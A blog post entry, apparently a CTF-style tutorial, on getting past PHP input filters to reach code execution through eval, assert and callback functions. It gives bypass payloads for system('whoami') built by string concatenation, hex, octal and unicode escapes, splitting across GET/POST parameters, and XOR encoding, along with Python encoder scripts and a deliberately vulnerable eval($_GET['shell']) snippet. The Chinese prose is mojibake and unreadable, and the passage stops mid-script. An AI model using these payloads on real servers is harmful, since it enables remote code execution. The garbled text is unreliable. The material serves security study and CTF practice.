      <title>PHP:è¿‡æ»¤é™åˆ¶ç»•è¿‡æ–¹æ³•</title>
      <link href="2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/"/>
      <url>2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a></p><h3 id="ä»£ç æ‰§è¡Œå‡½æ•°"><a href="#ä»£ç æ‰§è¡Œå‡½æ•°" class="headerlink" title="ä»£ç æ‰§è¡Œå‡½æ•°"></a>ä»£ç æ‰§è¡Œå‡½æ•°</h3><p>é¦–å…ˆæ¥çœ‹çœ‹åœ¨PHPä¸­æœ‰å“ªäº›å‡½æ•°æœ‰ä»£ç æ‰§è¡Œçš„åŠŸèƒ½</p><h4 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h4><p>æœ€å¸¸è§çš„ä»£ç æ‰§è¡Œå‡½æ•°ï¼ŒæŠŠå­—ç¬¦ä¸² code ä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚</p><pre class=" language-php"><code class="language-php"><span class="token function">eval</span> <span class="token punctuation">(</span> string <span class="token variable">$code</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> mixed</code></pre><h4 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h4><p>æ£€æŸ¥ä¸€ä¸ªæ–­è¨€æ˜¯å¦ä¸ºfalse</p><pre class=" language-php"><code class="language-php"><span class="token constant">PHP</span> <span class="token number">5</span><span class="token function">assert</span> <span class="token punctuation">(</span> mixed <span class="token variable">$assertion</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> string <span class="token variable">$description</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> bool</code></pre><pre class=" language-php"><code class="language-php"><span class="token constant">PHP</span> <span class="token number">7</span><span class="token function">assert</span> <span class="token punctuation">(</span> mixed <span class="token variable">$assertion</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> Throwable <span class="token variable">$exception</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> bool</code></pre><p>assert()ä¼šæ£€æŸ¥æŒ‡å®šçš„assertionå¹¶åœ¨ç»“æžœä¸ºfalseæ—¶é‡‡å–é€‚å½“çš„è¡ŒåŠ¨ã€‚åœ¨PHP5æˆ–PHP7ä¸­ï¼Œå¦‚æžœassertionæ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢«assert()å½“åšPHPä»£ç æ¥æ‰§è¡Œã€‚</p><h4 id="preg-replace-e"><a href="#preg-replace-e" class="headerlink" title="preg_replace()+/e"></a>preg_replace()+/e</h4><p>æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢</p><pre><code>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</code></pre><p>æœç´¢subjectä¸­åŒ¹é…patternçš„éƒ¨åˆ†ï¼Œä»¥replacementè¿›è¡Œæ›¿æ¢ã€‚å¦‚æžœpatternçš„æ¨¡å¼ä¿®é¥°ç¬¦ä½¿ç”¨/eï¼Œé‚£ä¹ˆå½“subjectè¢«åŒ¹é…æˆåŠŸæ—¶ï¼Œreplacementä¼šè¢«å½“åšPHPä»£ç æ‰§è¡Œ</p><pre><code>PSï¼š preg_replace()+å‡½æ•°çš„/eä¿®é¥°ç¬¦åœ¨PHP7ä¸­è¢«ç§»é™¤</code></pre><p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004140595.png" alt="1"></p><p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004201887.png" alt="2"></p><h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h4><p>åˆ›å»ºä¸€ä¸ªåŒ¿åï¼ˆlambdaæ ·å¼ï¼‰å‡½æ•°</p><pre class=" language-php"><code class="language-php"><span class="token function">create_function</span> <span class="token punctuation">(</span> string <span class="token variable">$args</span> <span class="token punctuation">,</span> string <span class="token variable">$code</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> string</code></pre><p>æ ¹æ®ä¼ é€’çš„å‚æ•°åˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œå¹¶ä¸ºå…¶è¿”å›žå”¯ä¸€çš„åç§°ã€‚å¦‚æžœæ²¡æœ‰ä¸¥æ ¼å¯¹å‚æ•°ä¼ é€’è¿›è¡Œè¿‡æ»¤ï¼Œæ”»å‡»è€…å¯ä»¥æž„é€ payloadä¼ é€’ç»™<code>create_function()</code>å¯¹<code>å‚æ•°æˆ–å‡½æ•°ä½“</code>é—­åˆæ³¨å…¥æ¶æ„ä»£ç å¯¼è‡´ä»£ç æ‰§è¡Œ<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004301611.png" alt="3"></p><h3 id="å¯å›žè°ƒå‡½æ•°"><a href="#å¯å›žè°ƒå‡½æ•°" class="headerlink" title="å¯å›žè°ƒå‡½æ•°"></a>å¯å›žè°ƒå‡½æ•°</h3><h4 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h4><p>ä¸ºæ•°ç»„çš„æ¯ä¸ªå…ƒç´ åº”ç”¨å›žè°ƒå‡½æ•°</p><pre><code>array_map ( callable $callback , array $array , array ...$arrays ) : array</code></pre><p>è¿”å›žæ•°ç»„ï¼Œæ˜¯ä¸º<code>array</code>æ¯ä¸ªå…ƒç´ åº”ç”¨<code>callback</code>å‡½æ•°ä¹‹åŽçš„æ•°ç»„ã€‚ <code>array_map()</code>è¿”å›žä¸€ä¸ª<code>array</code>ï¼Œæ•°ç»„å†…å®¹ä¸º<code>array1</code>çš„å…ƒç´ æŒ‰ç´¢å¼•é¡ºåºä¸ºå‚æ•°è°ƒç”¨<code>callback</code>åŽçš„ç»“æžœï¼ˆæœ‰æ›´å¤šæ•°ç»„æ—¶ï¼Œè¿˜ä¼šä¼ å…¥<code>arrays</code>çš„å…ƒç´ ï¼‰ã€‚ <code>callback</code>å‡½æ•°å½¢å‚çš„æ•°é‡å¿…é¡»åŒ¹é…<code>array_map()</code>å®žå‚ä¸­æ•°ç»„çš„æ•°é‡ã€‚</p><p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004401814.png" alt="4"></p><h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h4><p>æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›žè°ƒå‡½æ•°è°ƒç”¨</p><pre><code>call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) : mixed</code></pre><p>ç¬¬ä¸€ä¸ªå‚æ•°<code>callback</code>æ˜¯è¢«è°ƒç”¨çš„å›žè°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°æ˜¯å›žè°ƒå‡½æ•°çš„å‚æ•°ã€‚<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722011136128.png" alt="image-20210722011136128"></p><h4 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h4><p>è°ƒç”¨å›žè°ƒå‡½æ•°ï¼Œå¹¶æŠŠä¸€ä¸ªæ•°ç»„å‚æ•°ä½œä¸ºå›žè°ƒå‡½æ•°çš„å‚æ•°</p><p>call_user_func_array ( callable $callback , array $param_arr ) : mixed</p><p>æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›žè°ƒå‡½æ•°callbackè°ƒç”¨ï¼ŒæŠŠå‚æ•°æ•°ç»„ä½œparam_arrä¸ºå›žè°ƒå‡½æ•°çš„çš„å‚æ•°ä¼ å…¥ã€‚è·Ÿarray_map()ç›¸ä¼¼<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004459054.png" alt="5"></p><h4 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h4><p>ç”¨å›žè°ƒå‡½æ•°è¿‡æ»¤æ•°ç»„ä¸­çš„å•å…ƒ</p><pre><code>array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) : array</code></pre><p>ä¾æ¬¡å°†arrayæ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ä¼ é€’åˆ°callbackå‡½æ•°ã€‚å¦‚æžœcallbackå‡½æ•°è¿”å›žtrueï¼Œåˆ™arrayæ•°ç»„çš„å½“å‰å€¼ä¼šè¢«åŒ…å«åœ¨è¿”å›žçš„ç»“æžœæ•°ç»„ä¸­ã€‚æ•°ç»„çš„é”®åä¿ç•™ä¸å˜ã€‚<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004521379.png" alt="6"></p><h4 id="usort"><a href="#usort" class="headerlink" title="usort()"></a>usort()</h4><p>ä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰çš„æ¯”è¾ƒå‡½æ•°å¯¹æ•°ç»„ä¸­çš„å€¼è¿›è¡ŒæŽ’åº</p><pre><code>usort ( array &amp;$array , callable $value_compare_func ) : bool</code></pre><p>æœ¬å‡½æ•°å°†ç”¨ç”¨æˆ·è‡ªå®šä¹‰çš„æ¯”è¾ƒå‡½æ•°å¯¹ä¸€ä¸ªæ•°ç»„ä¸­çš„å€¼è¿›è¡ŒæŽ’åºã€‚ å¦‚æžœè¦æŽ’åºçš„æ•°ç»„éœ€è¦ç”¨ä¸€ç§ä¸å¯»å¸¸çš„æ ‡å‡†è¿›è¡ŒæŽ’åºï¼Œé‚£ä¹ˆåº”è¯¥ä½¿ç”¨æ­¤å‡½æ•°ã€‚</p><p>å½“PHP &lt; 5.6æ—¶<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004613149.png" alt="7"><br>å½“PHP &gt;= 5.6 &amp; PHP &lt; 7æ—¶ï¼Œphpæœ‰ä¸€ä¸ªå‚æ•°å˜é•¿ç‰¹æ€§<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004624831.png" alt="8"><br>ç­‰ç­‰è¿˜æœ‰å¾ˆå¤šå‡½æ•°å‚æ•°æ˜¯å¯å›žè°ƒçš„ï¼Œå°±ä¸ä¸€ä¸€åˆ—ä¸¾äº†ã€‚</p><p>æŽ¥ä¸‹æ¥æ ¹æ®å„ç§è¿‡æ»¤æƒ…å†µæ¥çœ‹çœ‹å…·ä½“çš„ä¸€äº›ç»•è¿‡æ–¹æ³•</p><h3 id="å­—ç¬¦ä¸²æ‹¼æŽ¥ç»•è¿‡"><a href="#å­—ç¬¦ä¸²æ‹¼æŽ¥ç»•è¿‡" class="headerlink" title="å­—ç¬¦ä¸²æ‹¼æŽ¥ç»•è¿‡"></a>å­—ç¬¦ä¸²æ‹¼æŽ¥ç»•è¿‡</h3><p>å­—ç¬¦ä¸²æ‹¼æŽ¥ç»•è¿‡é€‚ç”¨äºŽç»•è¿‡è¿‡æ»¤å…·ä½“å…³é”®å­—çš„é™åˆ¶</p><pre><code>é€‚ç”¨PHPç‰ˆæœ¬ï¼šPHP&gt;=7</code></pre><p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004702791.png" alt="9"></p><p>Payload:</p><pre><code>(p.h.p.i.n.f.o)();(sy.(st).em)(whoami);(sy.(st).em)(who.ami);(s.y.s.t.e.m)("whoami");.......</code></pre><pre><code>åœ¨PHPä¸­ä¸ä¸€å®šéœ€è¦å¼•å·(å•å¼•å·/åŒå¼•å·)æ¥è¡¨ç¤ºå­—ç¬¦ä¸²ã€‚PHPæ”¯æŒæˆ‘ä»¬å£°æ˜Žå…ƒç´ çš„ç±»åž‹ï¼Œæ¯”å¦‚$name = (string)mochu7;ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ$nameå°±åŒ…å«å­—ç¬¦ä¸²"mochu7"ï¼Œæ­¤å¤–ï¼Œå¦‚æžœä¸æ˜¾ç¤ºå£°æ˜Žç±»åž‹ï¼Œé‚£ä¹ˆPHPä¼šå°†åœ†æ‹¬å·å†…çš„æ•°æ®å½“æˆå­—ç¬¦ä¸²æ¥å¤„ç†</code></pre><h3 id="å­—ç¬¦ä¸²è½¬ä¹‰ç»•è¿‡"><a href="#å­—ç¬¦ä¸²è½¬ä¹‰ç»•è¿‡" class="headerlink" title="å­—ç¬¦ä¸²è½¬ä¹‰ç»•è¿‡"></a>å­—ç¬¦ä¸²è½¬ä¹‰ç»•è¿‡</h3><pre><code>é€‚ç”¨PHPç‰ˆæœ¬ï¼šPHP&gt;=7</code></pre><p>ä»¥å…«è¿›åˆ¶è¡¨ç¤ºçš„[0â€“7]{1,3}è½¬ä¹‰å­—ç¬¦ä¼šè‡ªåŠ¨é€‚é…byteï¼ˆå¦‚â€\400â€ == â€œ\000â€ï¼‰<br>ä»¥åå…­è¿›åˆ¶çš„\x[0â€“9A-Fa-f]{1,2}è½¬ä¹‰å­—ç¬¦è¡¨ç¤ºæ³•ï¼ˆå¦‚â€œ\x41â€ï¼‰<br>ä»¥Unicodeè¡¨ç¤ºçš„\u{[0â€“9A-Fa-f]+}å­—ç¬¦ï¼Œä¼šè¾“å‡ºä¸ºUTF-8å­—ç¬¦ä¸²</p><p><strong>æ³¨æ„è¿™é‡Œè½¬ä¹‰åŽçš„å­—ç¬¦å¿…é¡»åŒå¼•å·åŒ…è£¹ä¼ å‚</strong></p><p>Payloadå¤„ç†è„šæœ¬å¦‚ä¸‹ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span><span class="token keyword">def</span> <span class="token function">hex_payload</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    res_payload <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token string">"\\x"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        res_payload <span class="token operator">+=</span> i    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]'{}' Convert to hex: \"{}\""</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>res_payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">oct_payload</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    res_payload <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token string">"\\"</span> <span class="token operator">+</span> oct<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        res_payload <span class="token operator">+=</span> i    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]'{}' Convert to oct: \"{}\""</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>res_payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">uni_payload</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    res_payload <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token string">"\\u{{{0}}}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        res_payload <span class="token operator">+=</span> i    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]'{}' Convert to unicode: \"{}\""</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>res_payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">'phpinfo'</span>    hex_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    oct_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    uni_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre><p>Payload</p><pre><code>"\x70\x68\x70\x69\x6e\x66\x6f"();#phpinfo();"\163\171\163\164\145\155"('whoami');#system('whoami');"\u{73}\u{79}\u{73}\u{74}\u{65}\u{6d}"('id');#system('whoami');"\163\171\163\164\145\155"("\167\150\157\141\155\151");#system('whoami');.......</code></pre><p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004831266.png" alt="10"><br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004847635.png" alt="11"></p><p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004900042.png" alt="12">å¦å¤–ï¼Œå…«è¿›åˆ¶çš„æ–¹æ³•å¯ä»¥ç»•è¿‡æ— å­—æ¯ä¼ å‚è¿›è¡Œä»£ç æ‰§è¡Œ</p><pre><code>"\163\171\163\164\145\155"("\167\150\157\141\155\151");#system('whoami');</code></pre><p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004921639.png" alt="13"></p><h3 id="å¤šæ¬¡ä¼ å‚ç»•è¿‡"><a href="#å¤šæ¬¡ä¼ å‚ç»•è¿‡" class="headerlink" title="å¤šæ¬¡ä¼ å‚ç»•è¿‡"></a>å¤šæ¬¡ä¼ å‚ç»•è¿‡</h3><pre><code>é€‚ç”¨PHPç‰ˆæœ¬ï¼šæ— é™åˆ¶</code></pre><p>å¦‚æžœè¿‡æ»¤äº†<code>å¼•å·(å•å¼•å·/åŒå¼•å·)ï¼Œ</code>å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•ç»•è¿‡<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004955533.png" alt="14"></p><pre><code>GET:?1=system&amp;2=whoamiPOST:cmd=$_GET[1]($_GET[2]);</code></pre><p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005011972.png" alt="15"></p><pre><code>cmd=$_POST[1]($_POST[2]);&amp;1=system&amp;2=whoami</code></pre><p>å¦‚æžœ<code>PHPç‰ˆæœ¬å¤§äºŽ7</code>è¿™é‡Œè¿˜å¯ä»¥ç”¨æ‹¼æŽ¥çš„æ–¹æ³•ç»•è¿‡è¿‡æ»¤å¼•å·</p><pre><code>(sy.st.em)(whoami);</code></pre><p>å¦å¤–å¦‚æžœç¢°åˆ°å‚æ•°é•¿åº¦å—é™åˆ¶ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å¤šæ¬¡ä¼ å‚çš„æ–¹æ³•ç»•è¿‡å‚æ•°é•¿åº¦é™åˆ¶æˆ–è€…å›žè°ƒå‡½æ•°</p><p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005112326.png" alt="16"></p><p>å›žè°ƒå‡½æ•°å¯èƒ½å¤§éƒ¨åˆ†çœ‹é™åˆ¶çš„å…·ä½“é•¿åº¦ï¼Œä½†æ˜¯åœ¨<code>PHP &gt;= 5.6 &amp; PHP &lt; 7</code>æ—¶å¯¹ä»¥ä¸Šè¿‡æ»¤æ–¹æ³•å¯ä»¥ç»•è¿‡</p><p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005129999.png" alt="17"></p><h3 id="å†…ç½®å‡½æ•°è®¿é—®ç»•è¿‡"><a href="#å†…ç½®å‡½æ•°è®¿é—®ç»•è¿‡" class="headerlink" title="å†…ç½®å‡½æ•°è®¿é—®ç»•è¿‡"></a>å†…ç½®å‡½æ•°è®¿é—®ç»•è¿‡</h3><pre><code>é€‚ç”¨äºŽPHPç‰ˆæœ¬ï¼šWindowsæœ¬åœ°æµ‹è¯•çš„æ˜¯PHP&gt;=7å¯ä»¥æˆåŠŸï¼ŒPHP5æµ‹è¯•è™½ç„¶æŠ¥é”™ä½†æ˜¯å¹¶ä¸è‚¯å®šä¸èƒ½ä½¿ç”¨</code></pre><p>get_defined_functions()ï¼šè¿”å›žæ‰€æœ‰å·²å®šä¹‰å‡½æ•°çš„æ•°ç»„</p><p>è¯¦æƒ…è§ï¼š<a href="https://www.php.net/manual/zh/function.get-defined-functions.php">https://www.php.net/manual/zh/function.get-defined-functions.php</a></p><p>åˆ©ç”¨è¿™ç§æ–¹æ³•é¦–å…ˆè¿˜éœ€è¦çŸ¥é“PHPçš„å…·ä½“ç‰ˆæœ¬ï¼Œå› ä¸ºæ¯ä¸ªç‰ˆæœ¬çš„get_defined_functions()è¿”å›žçš„å€¼éƒ½æ˜¯ä¸ä¸€æ ·çš„ï¼Œè¿™é‡Œä»¥php7.4.3ä¸ºå‡†<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005344190.png" alt="18"></p><p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005358422.png" alt="19"></p><h3 id="å¼‚æˆ–ç»•è¿‡"><a href="#å¼‚æˆ–ç»•è¿‡" class="headerlink" title="å¼‚æˆ–ç»•è¿‡"></a><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005412630.png" alt="20">å¼‚æˆ–ç»•è¿‡</h3><pre><code>é€‚ç”¨PHPç‰ˆæœ¬ï¼šæ— é™åˆ¶</code></pre><p>åœ¨PHPä¸­ä¸¤ä¸ªå­—ç¬¦ä¸²å¼‚æˆ–ä¹‹åŽï¼Œå¾—åˆ°çš„è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚<br>ä¾‹å¦‚ï¼šæˆ‘ä»¬å¼‚æˆ– ? å’Œ ~ ä¹‹åŽå¾—åˆ°çš„æ˜¯ A<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005443996.png" alt="21"></p><pre><code>å­—ç¬¦ï¼š?         ASCIIç ï¼š63           äºŒè¿›åˆ¶ï¼š  00â€­11 1111â€¬å­—ç¬¦ï¼š~         ASCIIç ï¼š126          äºŒè¿›åˆ¶ï¼š  0111 1110â€¬å¼‚æˆ–è§„åˆ™ï¼š1   XOR   0   =   10   XOR   1   =   10   XOR   0   =   01   XOR   1   =   0ä¸Šè¿°ä¸¤ä¸ªå­—ç¬¦å¼‚æˆ–å¾—åˆ° äºŒè¿›åˆ¶ï¼š  0100 0001è¯¥äºŒè¿›åˆ¶çš„åè¿›åˆ¶ä¹Ÿå°±æ˜¯ï¼š65å¯¹åº”çš„ASCIIç æ˜¯ï¼šA</code></pre><p>æŽ¥ä¸‹æ¥çœ‹ä¸€é“ä¾‹é¢˜ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-z0-9]/is'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"hacker!!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>è¿‡æ»¤äº†æ‰€æœ‰è‹±æ–‡å­—æ¯å’Œæ•°å­—ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“ASCIIç ä¸­è¿˜æœ‰å¾ˆå¤šå­—æ¯æ•°å­—ä¹‹å¤–çš„å­—ç¬¦ï¼Œåˆ©ç”¨è¿™äº›å­—ç¬¦è¿›è¡Œå¼‚æˆ–å¯ä»¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦</p><pre><code>PSï¼šå–ASCIIè¡¨ç§éžå­—æ¯æ•°å­—çš„å…¶ä»–å­—ç¬¦ï¼Œè¦æ³¨æ„æœ‰äº›å­—ç¬¦å¯èƒ½ä¼šå½±å“æ•´ä¸ªè¯­å¥æ‰§è¡Œï¼Œæ‰€ä»¥è¦åŽ»æŽ‰å¦‚ï¼šåå¼•å·ï¼Œå•å¼•å·</code></pre><p>è„šæœ¬å¦‚ä¸‹ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>payload <span class="token operator">=</span> <span class="token string">"assert"</span>strlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#strlistæ˜¯asciiè¡¨ä¸­æ‰€æœ‰éžå­—æ¯æ•°å­—çš„å­—ç¬¦åè¿›åˆ¶</span>str1<span class="token punctuation">,</span>str2 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token keyword">for</span> char <span class="token keyword">in</span> payload<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> strlist<span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> strlist<span class="token punctuation">:</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">^</span> j <span class="token operator">==</span> ord<span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                i <span class="token operator">=</span> <span class="token string">'%{:0>2}'</span><span class="token punctuation">.</span>format<span class="token 